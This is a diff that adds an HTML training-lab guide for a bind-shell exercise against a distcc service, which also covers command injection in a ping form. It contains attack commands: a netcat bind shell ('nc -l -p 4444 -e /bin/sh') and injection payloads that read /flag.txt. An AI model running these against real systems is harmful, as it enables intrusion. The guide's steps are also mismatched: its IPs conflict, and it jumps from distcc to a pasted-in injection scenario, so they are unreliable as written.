@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+    <h1>Attacker Scenario 2: Bind Shell</h1>
+
+    <h2>Shells</h2>
+    <p>The machine initiating the connection will determine the type of <b>Shell</b> that is opened by a malicious cyber actor.  Regardless of direction, one of the machines must be <b>Listening</b> for a connection, which is typically initiated by the Attacker on either their machine or the victim's machine.</p>
+
+    <h2>Objective</h2>
+    <p>Identify a vulnerable service, research its exploitation method, and successfully execute a **Bind Shell** to gain control over a target server.</p>
+
+    <h2>Scenario</h2>
+    <p>A legacy server on the network is reportedly running a distributed compiler service (`distcc`). This service, if misconfigured, can allow remote users to execute arbitrary commands. Your goal is to exploit this service to force the target to open a "backdoor" listener that you can connect to.</p>
+    <p>The target is reachable at <code>172.30.0.30</code>.</p>
+
+    <h2>Steps</h2>
+    <h3>1. Service Identification</h3>
+    <p>Scan the target to find the <i>distcc</i> service. <code>nmap -Pn -sV -p3632 172.20.0.20</code></p>
+
+    <p>Look for port <b>3632</b>. It should be running <code>distcc v1</code>.</p>
+
+    <h3>2. Understanding Bind Shells (Forward Shells)</h3>
+    <p>In this scenario, we're going to explore the concept of a <b>Bind Shell</b>. Unlike a Reverse Shell (where the target calls you), a Bind Shell is when the target machine "binds" a shell to a specific port and waits for *you* to connect to it.</p>
+
+    <pre><b>Bind Shell</b>: Attacker-Machine ----Connects----> Victim-Machine</pre>
+
+    <pre><b>Reverse Shell</b>: Victim-Machine ----Connects----> Attacker-Machine</pre>
+
+    <p>This is often used when:</p>
+    <ol>
+        <li>The attacker's machine is behind a firewall or NAT that prevents incoming connections.</li>
+        <li>The target machine is allowed to have new listening ports.</li>
+    </ol>
+
+    <h3> 3. Trigger the Exploit</h3>
+    <p>We will use the Python script provided in this directory to send a malicious command to the `distcc` service. This command will tell the target to start a listener on port 4444 and attach a shell to it.</p>
+
+    <p>Execute the following in your terminal: <code>python3 exploit_distcc.py 172.20.0.20 "nohup nc -l -p 4444 -e /bin/sh >/dev/null 2>&1 &"</code></p>
+
+    <p>Try entering the following into the ping tool on the webpage: <code>127.0.0.1; ls /</code></p>
+
+    <p>Or via your terminal: <code>curl -X POST -d "ip=127.0.0.1; ls /" http://172.20.0.10</code></p>
+
+    <p>If the output shows a list of files in the root directory (like <i>bin, etc, home,</i> and notably <i><b>flag.txt</b></i>), the application is vulnerable!</p>
+
+    <h3>4. Exploitation</h3>
+    <p>Now that you have confirmed command injection, search for the flag.</p>
+
+    <p>Try to read the contents of "/flag.txt" using the injection: <code>127.0.0.1; cat /flag.txt</code></p>
+
+    <p>Or via your terminal: <code> curl -X POST -d "ip=127.0.0.1; cat /flag.txt" http://172.20.0.10</code></p>
+
+    <h3> 5. Post-Exploitation Discovery</h3>
+    <p>Command injection is particularly dangerous because it often gives the attacker the same permissions as the web server user. Let's see who we are running as: <code>127.0.0.1; whoami</code></p>    
+    
+    <p>Or via your terminal: <code>curl -X POST -d "ip=127.0.0.1; whoami" http://172.20.0.10</code></p>
+    
+    <p>You can also explore the network configuration of the target: <code>127.0.0.1; ifconfig</code></p>
+    
+    <p>An attacker would use this "foothold" to pivot deeper into the internal network, looking for databases, credentials, or other sensitive systems.</p>
+
+    <h3> 6. The "Why" - Real World Impact</h3>
+    <p>In a real environment, a single vulnerable form like this can lead to a full network compromise. Vulnerabilities like <b>Command Injection</b> (often categorized under OWASP Top 10's "Injection") occur when developers trust user input too much.</p>
+
+    <p>As a cybersecurity professional, your job is to find these "cracks in the armor" before an attacker does, helping developers build more resilient and secure applications.</p>
+
+    <h3> 7. Cleanup</h3>
+    <p>Run <code>./scenario1.sh reset</code> to reset the scenario environment for the next user.</p>
+
+    </body>
+</html>
